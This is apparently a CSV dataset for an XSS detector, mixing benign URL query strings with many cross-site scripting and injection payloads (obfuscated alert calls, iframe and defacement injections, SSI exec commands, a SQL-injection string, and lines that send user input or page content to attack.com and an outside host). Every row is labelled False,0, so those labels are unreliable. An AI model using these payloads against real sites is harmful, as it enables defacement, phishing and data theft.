Payload,Alert,Detected
k=MjUwOTsyMjsxNjU7NTEyMztmLmYuOS5wZC56byBgemhybnpzLmYuZkBAZkBAcGZk<br/>enJnQEArNl85QEBqZnpvcmdibXZnQEB4bF9waUBAZjsxMTk0NzY4NTU4OTQwOzE7OzszMzsyOzMwODE2MDk7href=http://www.<br/>r3t.n3t.nl,False,0
url=http://www.geocities.com/pinkelephant2k7/owned.html,False,0
keyword=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
Value=http://google.com,False,0
do=feedbacknew,False,0
ebReportURL=http%3A//r3t.n3t.nl,False,0
show=chat,False,0
onBeforeDeactivate,False,0
searchterm='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%3E%3Cbr%3E%3C<br/>marquee%3EWhiteHat%20Forever%3C/marque%3E,False,0
option=com_content&user_rating=1&submit_vote=index2.<br/>php?option=com_content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.<br/>com,False,0
"<body style=""background:gray"">",False,0
pt=2&vid=1<br/>189531221_2X04X204441892&rpt=1&kt=2,False,0
pid=32&la=1,False,0
"<div id=""68""><doc xmlns:xlink=""http://www.w3.org/1999/xlink"" xmlns:html=""http://www.w3.org/1999/xhtml"">",False,0
"<a/href=""j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)"" />click",False,0
p=50586&a=1276905&g=17216894&url=http://www.xssed.com,False,0
"fuseaction=classifieds.searchAction&keyWord=""><h1>MySpace%20X%20<br/>SS</h1><A%20HREF=""http://www.xssed.com/"">XSS%20(Fake%20myspace.com%20login%20page)<br><img%20src=""ht<br/>tp://img62.imageshack.us/img62/4615/stallowned3hb.jpg""></A><br><input%20type=""text""%20value=""Hexspir<br/>it""%20/><br><marquee>ROTFL!%20LMAO!%20OMG!</marquee><?",False,0
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=print()></output>",False,0
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;,False,0
_DARGS=/save/search/searchForm.jsp,False,0
cmd=login,False,0
url=http://cwdaimon.com/,False,0
alert?.(1),False,0
maingroup=<marquee><h1>By+St@rExT</h1>,False,0
appId=677489db-2d88-4dbf-91a0-078a3d352e84,False,0
s=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg%3C%2Fh1%3E%3C%2Fma<br/>rquee%3E&searchbutton=Go%21,False,0
"<div id=""114""><x style=""background:url('x[a];color:red;/*')"">XXX</x>//[""'`-->]]>]</div>",False,0
url=http://google.com,False,0
onMouseUp,False,0
"<IMGSRC='vbscript:msgbox(""XSS"")'>",False,0
msg=MackRulZ%20%20%20<img%20src=http://mackrul<br/>z.org/MackRulZimza.gif>,False,0
"q=""%2F><iframe+src%3D""http%3A%2F%2Fwww.xssed.com""%2F>&useractio<br/>n=search&ss=defLink&c=main&oq=""%2F><iframe+src%3D""http%3A%2F%2Fwww.xssed.com""%2F><marquee>xss+death-<br/>angel",False,0
url_frame=http://www.xssed.com,False,0
ref=show.asp?t=cross+site+scripting'%0a%20%20%20%20al<br/>ert('bkz:xss [Oda bkz:cross site scripting oluyor :D] {Stack Overflow :D}');',False,0
page=search,False,0
<img/src/onerror=alert&sol;&sol;(3)>,False,0
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foof>",False,0
FuseAction=Search,False,0
bannerid=174&zoneid=15&source=&dest=http://www.xssed.com/http:/<br/>/adserv.lowyat.net/adclick.php?bannerid=174&zoneid=15&source=&dest=http://www.xssed.com/,False,0
pt=all&lat=34.2547239&lon=-93.8283586,False,0
option=com_content&user_rating=1&submit_vote=1&task=vote&pop=0&I<br/>temid=10&cid=1&url=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
id=1337,False,0
method=redirect&redirect=http://uber0n.darkillusion.<br/>org/xsspage.htm,False,0
module=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/h1<br/>%3E%3C/marquee%3E&action=show_category&category_id=22,False,0
oncuechange,False,0
"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",False,0
mode=htmlexport&url=http%3A//xssed.com,False,0
<iframe src=http://vulnerability-lab.com/>@gmail.com,False,0
"<img STYLE=""xss:expr/*XSS*/ession(document.vulnerable=true)"">",False,0
"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",False,0
url=http://dephy.org/,False,0
email=%22%3E%3Ch1%3EBy%20Kusomiso.com%3C/h1%3E&name=%22%3E%3C<br/>h1%3EBy%20Kusomiso.com%3C/h1%3E,False,0
to=results&q=%22%3E%3Ch1%3EDr.Optix+%3A%3A+HTML+Injection+%3A%3A+PoC%3C<br/>%2Fh1%3E,False,0
"1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",False,0
bannerid=220&zoneid=0&source=111-222-1933email@addre<br/>ss.com&dest=http://xssed.com,False,0
KeepThis=true&path_to_file=http://xssed.com&TB_<br/>iframe=true&height=550&width=800,False,0
';top['\141\154\145\162\164']('\130\123\123');//,False,0
id=22496&search=%22%3E%3Cimg%20src=http://i48.tinypic.com/dw5dkz<br/>.png%3E%3C/img%3E%3C%22,False,0
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br/>][][][][][]=%3Cscript%20src=http://hiphopshare.xm.com/xss.js,False,0
search=%22%3E%3Ch1%3EHacked%3Ciframe%20src=http://xssed.com%3E,False,0
page=http://elredtuning.altervista.org,False,0
target=http://en.wikipedia.org/wiki/Columbine_High_School_massac<br/>re,False,0
"<div style=""behaviour: url([link to code]);"">",False,0
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;AnonKryptiQuz&lt;/A&gt;",False,0
</image>,False,0
"<style>:target {transform: rotate(180deg);}</style><head id=x style=""transition:transform 2s"" ontransitionrun=print()></head>",False,0
lngID=35&lngLangID=1,False,0
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2),False,0
result=%3Ch1%3EDarkMindZ.com%3C/h1%3E,False,0
stimes=OK&language=5&CDTYPE=&category[]=ALL&searc<br/>hin=STA&keyword=%3Ciframe%20width=600%20height=700%20src=http://www.moserbaerhomevideo.com%3E&x=0&y=<br/>0&sbox=OK,False,0
'-[document.domain].map(alert)-',False,0
onBounce,False,0
onFocus,False,0
dom=ca&start=%3Ciframe%20src=http://google.com%3E%3C/iframe%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><meta id=x style=""transition:transform 2s"" ontransitionrun=print()></meta>",False,0
product%5Fcode=78952&index=0&MSCSProfile=JD1P4KJ<br/>4S5PF9NW8UJ6QF43GKJD51L58,False,0
&lt;HTML&gt;&lt;BODY&gt;,False,0
url=http://bit.ly/bItn7J,False,0
sendto=http://elredtuning.altervista.org,False,0
"fid=""><h1>Defaced-By-TurKPoweR</h1>",False,0
"SRC=""http://ha.ckers.org/.swf"" AllowScriptAccess=""always""",False,0
http://uber0n.darkillusion.org/xsspage.htm,False,0
id=gua_1070=%22%3E%3Ciframe%20src=http:<br/>//www.google.com%20width=866%20height=423%3E%3C/iframe%3E,False,0
URL=http://trex.li/,False,0
lid=sk&tid=beauvoir&f_user=&six=&f_email==%22%3E%3Ch1%3ENul<br/>l%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
url=http://www.googlebig.com,False,0
m=<iframe src='http://google.com'>,False,0
onvolumechange,False,0
option=com_content&user_rating=1&submit_vote=1&task=vote&pop=0&It<br/>emid=10&cid=1&url=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
id='%22%3E%3C/iframe%3E%3Ciframe%20src=http://pc-kopat.us/hacked/%3E,False,0
<b>XSS</b>,False,0
"<x onauxclick=a=alert,a(domain)>click",False,0
c3kso7cqsmltafy,False,0
"route=70&direction=East%20Bound&stop=Division%20%26<br/>%20Lamon&id=1981<iframe src=""http://xssed.com"">&showAllBusses=on",False,0
uid=500606957&assoc=SetAsHomepageAssocInterstitial&<br/>action=cancel&redirect=http://www.google.com,False,0
d=%27%22%3E%3Cmarquee%3EXSS%20by%20SylTroX%3Ciframe%20src=%27<br/>http://xssed.com%27/%3E&p=%27%22%3E%3Cmarquee%3EXSS%20by%20SylTroX%3Ciframe%20src=%27http://xssed.co<br/>m%27/%3E&id=%27%22%3E%3Cmarquee%3EXSS%20by%20SylTroX%3Ciframe%20src=%27http://xssed.com%27/%3E,False,0
option=com_content&user_rating=1&submit_v<br/>ote=index2.php?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemi<br/>d=10&cid=1&url=http://xssed.com,False,0
nats=%22%3E%3Ciframe%20src=http://hypnozh<br/>ack.org/hacked/%3E,False,0
onMouseEnter,False,0
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'""-->",False,0
searchbox=%22%3E%3Cbig%3E%3Cbold%3E%3Cfont%20color=red%3E%3Cmarqu<br/>ee%3EXSS%3C/marquee%3E%3C/font%3E%3C/bold%3E%3C/big%3E,False,0
"<style>:target {color: red;}</style><br id=x style=""transition:color 10s"" ontransitioncancel=print()></br>",False,0
event1=demo_out&event2=sm_demo&event3=pdemo&goto=http:/<br/>/www.xssed.com/news/29/The_dangers_of_Redirect_vulnerabilities/,False,0
%22%20autofocus%20onfocus%00%3d(confirm)(1)%2f%2f,False,0
"tYPE=""text/x-scriptlet"" DATA=""http://.rocks/scriptlet.html",False,0
secao=1&Idioma=Port&Mode=Especial&Page=http://ww13.itau<br/>.com.br@vuln.xssed.net/thirdparty/scripts/python5.html,False,0
weiter=1&url=http://www.google.com,False,0
option=com_content&user_rating=1&submit_vote=index2.php?<br/>option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=<br/>%0AContent-Type:%16text/html%0AContent-Length:13%0A%0Axssed+starext,False,0
url=http://xssed.com&p=75&fc=1,False,0
s=europeregistry,False,0
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;,False,0
cmd=search&words=%3Cfont%20color='red'%3E%3Cmarquee%3EX<br/>SSED_bY_SaMTHG%3C/marquee%3E%3C/font%3E&searchWhere=0&mode=normal,False,0
motcle=%3Ciframe+height%3D%22999%22+width%3D%22999%22+src%3D%22h<br/>ttp%3A%2F%2Fxssed.com%2F%22%3E,False,0
ondrop,False,0
<!--,False,0
search_str=%22%3E%3Ciframe%20src=http://xssed.com%3E&op=search&su<br/>bmit_search=Leia,False,0
PC_7_0_1LG2_command=forgottenPassword,False,0
id=show&par=&typ=1&viewnr=%22%3Cmarquee%3E%3Cfont%20color=red%3ERubberDuck%3C/font<br/>%3E%3C/marquee%3E,False,0
"<style>:target {color: red;}</style><rp id=x style=""transition:color 10s"" ontransitioncancel=print()></rp>",False,0
event1=demo_out&event2=sm_demo&event3=pdemo&goto=http<br/>://www.xssed.com/news/29/The_dangers_of_Redirect_vulnerabilities/,False,0
qt=dismax&sort=score+desc&query=%22%3E%3Ciframe+src%3D%22http%3A%2F%2Fxssed<br/>.com%22%3E&submit=,False,0
window.location.href = 'http://attack.com?user=' + user_input;,False,0
"<a HREF=""data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg=="">ugh</a>",False,0
bannerid=41&zoneid=4&source=&dest=http://xssed.com,False,0
query=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20ironzorg%3C/<br/>h1%3E%3C/marquee%3E,False,0
link=http://xssed.com/,False,0
P1=search&P2=action,False,0
"contentRegion=""><marquee>XSSed_bY_SaMTHG</marquee<br/>>",False,0
q=%3Cmarquee%3Esexxxxxxxxxxxxxxxxxxxx,False,0
<http://onxxx%3D1/,False,0
tag=<iframe src=http://www.google.com></iframe>,False,0
p_origin=internal&p_name=search_engine&p_optio<br/>ns=%27%22%3E%3Ciframe%20src=http://xssed.com%3E,False,0
query=%3Ch1%3EHacked+By+Hack-Labs%3C%2Fh1%3E&www=true,False,0
string=%22%3E%3Ch1%3EXss%20by%20n0b0dy%3C%2Fh1%3E,False,0
"';parent['\x65\x76\x61\x6c']('parent[""\x61\x6c\x65\x72\x74""](parent[""\x61\x74\x6f\x62""](""WFNT""))');//",False,0
f=http://forum.mastercoders.org,False,0
artist=&title=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY+INTERNET+SECURIT,False,0
"<style>:target {color: red;}</style><samp id=x style=""transition:color 10s"" ontransitioncancel=print()></samp>",False,0
page=Main/shell.php,False,0
a_id=1742&tt=cotswold,False,0
"id='""><iframe%20src=http://xssed.com>",False,0
s=100&c=3&l=m7090-thumb&u=http://www.xssed.com,False,0
folder=search&page=search_post,False,0
file=challenge.php&id=<marquee><h1>XSS,False,0
goto=http://starext.by.ru/s.html,False,0
onDeactivate,False,0
"?url=""onm<>ouseover=""ale<>rt(0)",False,0
option=com_content&user_rating=1&submit_vote=i<br/>ndex2.php?option=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&<br/>cid=1&url=http://xssed.com,False,0
apid=books&areaid=wel_left_02_1_3&url=http://www.google.com,False,0
"<style>:target {transform: rotate(180deg);}</style><output id=x style=""transition:transform 2s"" ontransitionrun=print()></output>",False,0
"<style>:target {transform: rotate(180deg);}</style><rb id=x style=""transition:transform 2s"" ontransitionrun=print()></rb>",False,0
option=com_content&user_rating=1&submit_vote=1&task=vote&po<br/>p=0&Itemid=10&cid=1&url=http://vuln.xssed.net/thirdparty/scripts/python5.html,False,0
"<style>:target {transform: rotate(180deg);}</style><video2 id=x style=""transition:transform 2s"" ontransitionrun=print()></video2>",False,0
pageid=68,False,0
title=foobar%3Cimg%20style='position:absolute;top:10px;<br/>left:100px;'%20%20src=http://hosto.ru/znako/ban-prost.gif%3E,False,0
term=%22%3E%3Cmarquee%3EXSSed_bY_SaMTHG&sm=Search&source=1&req=<br/>search,False,0
onpaste,False,0
"Query=<iframe<br/>src=""http://xssed.com"">&pricelisttop=0&image.x=0&image.y=0&image=Go&categoryid=All&file=s-keyword_se<br/>arch",False,0
type=A&PageNo=1%3Ctitle%3Ecentrinel%20was%20here.<br/>.%3C/title%3E%3Ciframe%20src=http://xssed.com%3E&t=&cap=&name=,False,0
"app=""/><iframe src=""http://xssed.com"">",False,0
lid=3&tid=4&f_user=&six=&f_email==%22%3E%3Ch1<br/>%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",False,0
tx_pbsurvey_pi1[77][0][0]=%22%3E%3Ch1%3EDING%20<br/>DING%20DING%20DING%20DING%20DING%3C/h1%3E%3Cimg%20src=//www.gamgea.com/wp-content/uploads/2010/06/re<br/>tro-mario-in-3d-flavor.gif%3E,False,0
"<style>:target {transform: rotate(180deg);}</style><footer id=x style=""transition:transform 2s"" ontransitionrun=print()></footer>",False,0
url=http://xssed.com/&rank=22,False,0
find=%22%3E%3Ciframe%20src=http://thehacking.org/%3E,False,0
i=http://www.bing.com,False,0
lang=es%22%20%3C/iframe%3E%22%20%3Ciframe%20src=%22http://xssed.com<br/>%22%3E,False,0
referrer=client%22%3E%3Ciframe%20src=http://xsse<br/>d.com%3E,False,0
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",False,0
onmousewheel,False,0
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,False,0
name=%22'%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3Ecueballr%3C/stron<br/>g%3E%3C/h1%3E%3C/marquee%3E,False,0
oaparams=2__bannerid=28__zoneid=20__cb=0eb8ad4541__oa<br/>dest=http://google.com,False,0
onMouseLeave,False,0
"<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",False,0
